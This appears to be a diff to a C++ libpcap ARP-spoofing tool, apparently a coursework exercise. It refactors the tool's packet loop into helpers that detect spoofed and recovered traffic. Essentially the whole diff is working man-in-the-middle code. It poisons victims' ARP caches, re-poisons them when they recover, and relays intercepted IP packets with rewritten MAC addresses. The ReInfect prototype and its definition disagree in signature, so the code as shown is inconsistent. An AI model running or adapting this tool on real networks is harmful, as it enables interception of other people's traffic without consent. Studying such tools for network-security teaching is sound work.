@@ -33,8 +33,12 @@ Mac GetMac_ByIp(pcap_t* handle, Ip myIp, Mac myMac, Ip Ip);
 EthArpPacket MakeArpPacket(int mode, pcap_t* handle, Mac eth_smac, Mac eth_dmac, Mac arp_smac, Ip arp_sip, Mac arp_tmac, Ip arp_tip);
 void SendArpPacket(pcap_t* handle, EthArpPacket packet);
 void SendIpPacket(pcap_t* handle, EthIpPacket packet, int size);
+bool isSpoofed(const u_char *replyPacket, FlowInfo info);
+bool isRecovered(const u_char *replyPacket, FlowInfo info);
+bool ReInfect(const u_char *replyPacket, FlowInfo info);
+void Relay(pcap_t* handle, struct pcap_pkthdr* header, const u_char *replyPacket, FlowInfo info);
 void Infect(pcap_t *handle);
-void Reinfect_n_Relay(pcap_t* handle);
+void Receive(pcap_t* handle);
 
 bool runThread = true;
 
@@ -137,7 +141,7 @@ EthArpPacket MakeArpPacket(int mode, pcap_t* handle, Mac eth_smac, Mac eth_dmac,
 void SendArpPacket(pcap_t* handle, EthArpPacket packet){
 	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
 	if (res != 0) {
-		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+		fprintf(stderr, "Infect Failed return %d error=%s\n", res, pcap_geterr(handle));
 	}
 	return;
 }
@@ -145,9 +149,35 @@ void SendArpPacket(pcap_t* handle, EthArpPacket packet){
 void SendIpPacket(pcap_t* handle, EthIpPacket packet, int size){
 	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), size);
 	if (res != 0) {
-		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+		fprintf(stderr, "Relay Failed return %d error=%s\n", res, pcap_geterr(handle));
 	}
 	return;
+}
+
+bool isSpoofed(const u_char *replyPacket, FlowInfo info){
+	EthHdr *eth = (struct EthHdr *)replyPacket;
+	if (eth->type() == EthHdr::Ip4){
+		EthIpPacket *ipPacket = (struct EthIpPacket *)replyPacket;
+		if (ipPacket->ip_.sip() == info.senderIp && ipPacket->eth_.smac() == info.senderMac)
+			return true;
+	}
+	return false;
+}
+
+bool isRecovered(const u_char *replyPacket, FlowInfo info){
+	EthHdr *eth = (struct EthHdr *)replyPacket;
+	if (eth->type() == EthHdr::Arp){
+		EthArpPacket *arpPacket = (struct EthArpPacket *)replyPacket;
+		if (arpPacket->arp_.op() == ArpHdr::Reply){
+			if (arpPacket->eth_.dmac() == info.senderMac)
+				return true;
+			if (arpPacket->eth_.dmac() == info.targetMac)
+				return true;
+			if (arpPacket->eth_.dmac() == Mac::broadcastMac())
+				return true;
+		}
+	}
+	return false;
 }
 
 void Infect(pcap_t *handle){
@@ -159,7 +189,18 @@ void Infect(pcap_t *handle){
 	}
 }
 
-void Reinfect_n_Relay(pcap_t* handle){
+void ReInfect(pcap_t *handle, FlowInfo info){
+	SendArpPacket(handle, info.infectPkt);
+}
+
+void Relay(pcap_t* handle, struct pcap_pkthdr* header, const u_char *replyPacket, FlowInfo info){
+	EthIpPacket *ipPacket = (struct EthIpPacket *)replyPacket;
+	ipPacket->eth_.smac_ = info.attackerMac;
+	ipPacket->eth_.dmac_ = info.targetMac;
+	SendIpPacket(handle, *ipPacket, header->len);
+}
+
+void Receive(pcap_t* handle){
 	struct pcap_pkthdr* header;
 	const u_char* replyPacket;
 	while(runThread){
@@ -170,34 +211,14 @@ void Reinfect_n_Relay(pcap_t* handle){
 			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
 			break;
 		}
-		
-		EthHdr* eth = (struct EthHdr*)replyPacket;
 
-		// ArpPacket : reinfect
-		if(eth->type() == EthHdr::Arp){
-			EthArpPacket* arpPacket = (struct EthArpPacket*)replyPacket;
-			if(arpPacket->arp_.op() == ArpHdr::Reply){
-				for(auto iter : flows){
-					if(arpPacket->arp_.sip() == iter.senderIp && arpPacket->arp_.tip_ == iter.targetIp){
-						SendArpPacket(handle, iter.infectPkt);
-						sleep(1);
-						break;
-					}
-				}
-			}
-		}
-
-		// IpPacket : relay
-		if(eth->type() == EthHdr::Ip4){
-			EthIpPacket* ipPacket = (struct EthIpPacket*)replyPacket;
-				for(auto iter : flows){
-					if(ipPacket->ip_.sip() == iter.senderIp && ipPacket->ip_.dip() == iter.attackerIp){
-						ipPacket->eth_.smac_ = iter.attackerMac;
-						ipPacket->eth_.dmac_ = iter.targetMac;
-						SendIpPacket(handle, *ipPacket, header->caplen);
-						break;
-					}
-				}
+		for(auto iter: flows){
+			// spoofed -> relay
+			if(isSpoofed(replyPacket, iter))
+				Relay(handle, header, replyPacket, iter);
+			// recovered -> reinfect
+			if(isRecovered(replyPacket,iter))
+				ReInfect(handle, iter);
 		}
 	}
 }
@@ -222,7 +243,7 @@ int main(int argc, char* argv[]) {
 	printf("[ATTACKER IP ADDR = %s]\n", std::string(attackerIp).c_str());
 	arpTable[attackerIp] = attackerMac;
 
-	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
+	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
 	if (handle == nullptr) {
 		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
 		return -1;
@@ -262,10 +283,10 @@ int main(int argc, char* argv[]) {
 
 	signal(SIGINT, signal_handler);
 	std::thread infect_t(Infect, handle);
-	std::thread relay_t(Reinfect_n_Relay, handle);
+	std::thread receive_t(Receive, handle);
 	
 	infect_t.join();
-	relay_t.join();
+	receive_t.join();
 
 
 	pcap_close(handle);
